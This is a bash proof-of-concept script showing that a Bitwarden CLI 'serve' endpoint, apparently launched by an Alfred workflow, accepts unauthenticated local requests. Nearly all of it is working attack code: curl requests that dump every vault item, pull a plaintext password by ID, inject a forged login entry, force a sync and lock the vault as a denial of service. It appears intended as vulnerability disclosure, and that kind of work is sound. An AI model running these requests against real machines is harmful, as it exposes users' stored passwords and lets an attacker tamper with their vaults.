#!/bin/bash
# ============================================================
# PoC #3 — Unauthenticated Local HTTP API (CRITICAL)
# Vulnerability: lib/env.sh:20, bin/start_server.sh:16
#
#   bw serve --hostname localhost --port 8087
#
# The Bitwarden CLI's `serve` subcommand exposes an HTTP API with
# no authentication whatsoever.  Any local process (any user account,
# any other app) can read, create, modify and delete vault entries
# while the vault is unlocked — without knowing the master password.
#
# This PoC demonstrates the full impact:
#   A) Dump all vault item metadata
#   B) Retrieve a specific password by item ID
#   C) Create a new vault entry
#   D) Trigger a vault sync
#   E) Lock the vault (denial of service against the legitimate user)
# ============================================================

API="${API:-http://localhost:8087}"

banner() { echo; echo "=== $* ==="; echo; }
ok()     { echo "[+] $*"; }
info()   { echo "[*] $*"; }
err()    { echo "[-] $*"; }

check_server() {
    curl -s --connect-timeout 2 "${API}/status" > /dev/null 2>&1
}

# ---------- Prerequisite check ----------
banner "Prerequisite: Is bw serve running and vault unlocked?"

if ! check_server; then
    err "Cannot reach ${API}/status"
    err "Start the workflow (Alfred 'bw' keyword) and unlock the vault first."
    exit 1
fi

STATUS=$(curl -s "${API}/status" | python3 -c \
    "import sys,json; d=json.load(sys.stdin); print(d['data']['template']['status'])" 2>/dev/null)

ok "Server reachable at ${API}"
info "Vault status: ${STATUS}"

if [ "${STATUS}" != "unlocked" ]; then
    err "Vault is not unlocked.  Unlock it via Alfred first."
    err "Demonstrating API reachability only."
fi

# ---------- Part A: Dump all vault items ----------
banner "Part A — Dump all vault items (no credentials required)"

info "GET ${API}/list/object/items"
ITEMS=$(curl -s "${API}/list/object/items")

COUNT=$(echo "${ITEMS}" | python3 -c \
    "import sys,json; d=json.load(sys.stdin); print(len(d.get('data',{}).get('data',[])))" 2>/dev/null)

ok "Retrieved ${COUNT} vault items without any authentication."
echo
echo "First 3 item names and IDs:"
echo "${ITEMS}" | python3 -c "
import sys, json
d = json.load(sys.stdin)
items = d.get('data', {}).get('data', [])
for item in items[:3]:
    print(f\"  name={item.get('name','?')!r}  id={item.get('id','?')}\")
" 2>/dev/null || echo "${ITEMS}" | head -5

# ---------- Part B: Retrieve a password ----------
banner "Part B — Retrieve a password by item ID"

FIRST_ID=$(echo "${ITEMS}" | python3 -c "
import sys, json
d = json.load(sys.stdin)
items = d.get('data', {}).get('data', [])
login_items = [i for i in items if i.get('type') == 1]
print(login_items[0]['id'] if login_items else '')
" 2>/dev/null)

if [ -n "${FIRST_ID}" ]; then
    info "GET ${API}/object/password/${FIRST_ID}"
    PASSWORD_RESP=$(curl -s "${API}/object/password/${FIRST_ID}")
    ok "Password retrieved for item ${FIRST_ID}:"
    echo "${PASSWORD_RESP}" | python3 -c \
        "import sys,json; d=json.load(sys.stdin); print('  password =', repr(d.get('data',{}).get('data','(none)')))" \
        2>/dev/null || echo "${PASSWORD_RESP}"
else
    info "No login-type items found to demonstrate password retrieval."
fi

# ---------- Part C: Create a new vault entry ----------
banner "Part C — Create a new vault entry"

PAYLOAD='{"type":1,"name":"PoC_Injected_Entry","login":{"username":"poc_attacker","password":"poc_proof_of_concept","uris":[{"match":null,"uri":"https://poc.example.com"}]}}'

info "POST ${API}/object/item"
info "Payload: ${PAYLOAD}"
CREATE_RESP=$(curl -s \
    -H 'Content-Type: application/json' \
    -d "${PAYLOAD}" \
    "${API}/object/item")

SUCCESS=$(echo "${CREATE_RESP}" | python3 -c \
    "import sys,json; print(json.load(sys.stdin).get('success','?'))" 2>/dev/null)

NEW_ID=$(echo "${CREATE_RESP}" | python3 -c \
    "import sys,json; print(json.load(sys.stdin).get('data',{}).get('id',''))" 2>/dev/null)

if [ "${SUCCESS}" == "True" ] || [ "${SUCCESS}" == "true" ]; then
    ok "New item created with ID: ${NEW_ID}"
    ok "Any local process just added a credential to the victim's vault."
    echo
    info "Cleaning up: deleting the PoC item..."
    DEL_RESP=$(curl -s -X DELETE "${API}/object/item/${NEW_ID}")
    echo "${DEL_RESP}" | python3 -c \
        "import sys,json; print('[+] Deleted:', json.load(sys.stdin).get('success'))" 2>/dev/null
else
    info "Create response: ${CREATE_RESP}"
fi

# ---------- Part D: Trigger sync ----------
banner "Part D — Force vault sync"

info "POST ${API}/sync"
SYNC_RESP=$(curl -s -X POST "${API}/sync")
ok "Sync triggered: $(echo "${SYNC_RESP}" | python3 -c \
    "import sys,json; print(json.load(sys.stdin).get('success','?'))" 2>/dev/null)"

# ---------- Part E: Lock the vault (DoS) ----------
banner "Part E — Lock the vault (denial of service)"

echo "A rogue process can lock the victim's vault at any time."
echo "This disrupts the user's workflow and forces re-authentication."
echo
read -rp "Press ENTER to lock the vault (or Ctrl-C to skip): "

info "POST ${API}/lock"
LOCK_RESP=$(curl -s -X POST "${API}/lock")
ok "Lock result: $(echo "${LOCK_RESP}" | python3 -c \
    "import sys,json; print(json.load(sys.stdin).get('success','?'))" 2>/dev/null)"

echo
echo "RESULT: All five operations succeeded with zero authentication."
echo "        Any co-resident process on this machine has full read/write"
echo "        access to the Bitwarden vault while it is unlocked."
